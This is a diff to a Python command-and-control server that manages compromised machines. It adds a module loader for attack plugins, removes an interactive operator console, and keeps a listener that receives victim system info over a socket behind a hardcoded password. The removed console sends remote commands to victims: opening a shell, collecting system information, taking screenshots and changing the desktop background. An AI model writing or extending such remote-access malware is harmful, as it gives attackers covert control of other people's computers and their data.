@@ -13,10 +13,22 @@ class C2():
         self.ANODE = ANODE
         self.APORT = APORT
         self.PASS  = "pontifex"
+        self.modules_multi = self.load_modules("modules/multi")
         self.interactive = False
         self.keepAliveSleepInterval = 5
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    def load_modules(self, path):
+        sys.path.append(path)
+        modules = {}
+        for mod in os.listdir(path):
+            if mod == '__init__.py' or mod[-3:] != '.py':
+                continue
+            else:
+                m = __import__(mod[:-3]).module()
+                modules[m.Command] = m
+        return modules
 
     @safe_exec
     def listener(self):
@@ -31,34 +43,8 @@ class C2():
 
             intel = json.loads(intel)
                 #print(intel)
-            return Dmos(intel["basic"], intel["sysinfo"], address[0], conn)
+            return Dmos(intel["basic"], intel["sysinfo"], address[0], conn, self)
 
-    @safe_exec
-    def interact(self, dmos):
-        conn = dmos.conn
-        while 1:
-            command = input(colored("[{}@{}]>> ".format(dmos.USERNAME, dmos.GLOBAL), 'cyan', attrs=['bold']))
-            if command == "free":
-                dmos.free_dmos()
-                terminate(conn, self.multi_handler.dmoss, dmos, "gracefully")
-                break
-            elif command == "shell":
-                dmos.interactive_shell()
-            elif command == "sysinfo":
-                dmos.system_info()
-            elif command == "fat":
-                dmos.send(command.encode())
-            elif command == "screenshot":
-                dmos.screenshot()
-                Debug.tprint("sc downloaded")
-            elif command[:9] == "bgchange ":
-                a, path = command.split(' ')
-                dmos.background_changer(path)
-            elif command == "clear":
-                os.system("clear")
-            elif command == "b":
-                self.multi_handler.cmdline()
-                pass
     @safe_exec
     def keepAlive(self):
         while 1:
